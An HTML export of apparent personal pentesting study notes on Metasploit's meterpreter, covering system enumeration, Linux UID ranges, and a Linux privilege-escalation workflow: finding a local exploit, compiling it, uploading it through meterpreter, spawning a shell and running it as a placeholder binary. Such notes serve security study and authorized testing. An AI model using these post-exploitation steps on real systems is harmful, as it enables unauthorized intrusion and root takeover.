<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>meterpreter</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>meterpreter</h1><br/><br /><div class="codebox"><pre>meterpreter &gt; sysinfo</pre></div><br />    <a href=""><img src="images/911-1.png" alt="images/911-1.png" /></a><br />very similar to the command<br /><div class="codebox"><pre>meterpreter &gt; run post<span style="color:#ff9d00;font-weight:700">/</span>linux<span style="color:#ff9d00;font-weight:700">/</span>gather<span style="color:#ff9d00;font-weight:700">/</span>enum_system</pre></div><br /><br /><br /><div class="codebox"><pre>meterpreter &gt; getuid</pre></div><br /><br />    <a href=""><img src="images/911-2.png" alt="images/911-2.png" /></a><br />    <a href=""><img src="images/911-3.png" alt="images/911-3.png" /></a><br />    UID=0 → root user <br />    UID=1-100 → first 100 UIDs for system use<br />    UID=500-1500 → new users are assigned UIDs starting from 500 or 1000<br />        In Ubuntu a new user start from 1000, next user after the first will be 1001<br /><br /><strong><h3>Privilege escalation(Linux): search on Metasploit</h3></strong><br />There are only few modules available to exploit locally Linux systems, to see them we can use:<br /><div class="codebox"><pre>meterpreter &gt; background<br />msf&gt; search type<span style="color:#ff9d00;font-weight:700">:</span>exploit platform<span style="color:#ff9d00;font-weight:700">:</span>linux <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> <span style="color:#ff9d00;font-weight:700">local</span></pre></div><br /><br /><strong><h3>Privilege escalation(Linux): search on Google</h3></strong><br />Because there are only a few modules we have to search the exploits manually.<br />The best way to do this is search the target OS on Google followed by &quot;privilege escalation&quot;<br /><a href=""><img src="images/911-4.png" alt="images/911-4.png" /></a><br /><a href=""><img src="images/911-5.png" alt="images/911-5.png" /></a><br /><a href=""><img src="images/911-6.png" alt="images/911-6.png" /></a><br />we have to compile the exploit found:<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">gcc</span> &lt;exploit-name&gt;.c -o &lt;compiled-exploit&gt;</pre></div><br />and upload it with meterpreter:<br /><div class="codebox"><pre>meterpreter &gt; upload &lt;compiled-exploit&gt; <span style="color:#ff9d00;font-weight:700">.</span>    <span style="color:#0088ff;font-weight:400">#the dot(.) mean that the file will be uploaded in</span><br />                                             <span style="color:#0088ff;font-weight:400">#the actual folder of the target machine</span></pre></div><br /><a href=""><img src="images/911-7.png" alt="images/911-7.png" /></a><br />now we have to make executable the file:<br /><div class="codebox"><pre>meterpreter &gt; execute -f <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span> -i -c           <span style="color:#0088ff;font-weight:400">#execute the shell</span><br /><span style="color:#ff9d00;font-weight:700">chmod</span> +x &lt;compiled-exploit&gt;                      <span style="color:#0088ff;font-weight:400">#make executable the exploit</span></pre></div><br />and execute the exploit:<br /><div class="codebox"><pre>.<span style="color:#ff9d00;font-weight:700">/</span>&lt;compiled-exploit&gt;</pre></div><br />to see if the exploit worked:<br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">whoami</span>                                       <span style="color:#0088ff;font-weight:400">#from the shell</span><br />CTRL-C to come back to meterpreter           <span style="color:#0088ff;font-weight:400">#if we come back to meterpreter in some cases we lose</span><br />                                             <span style="color:#0088ff;font-weight:400">#the privileges</span></pre></div><br /><a href=""><img src="images/911-8.png" alt="images/911-8.png" /></a><br /></div>
</body>
</html>
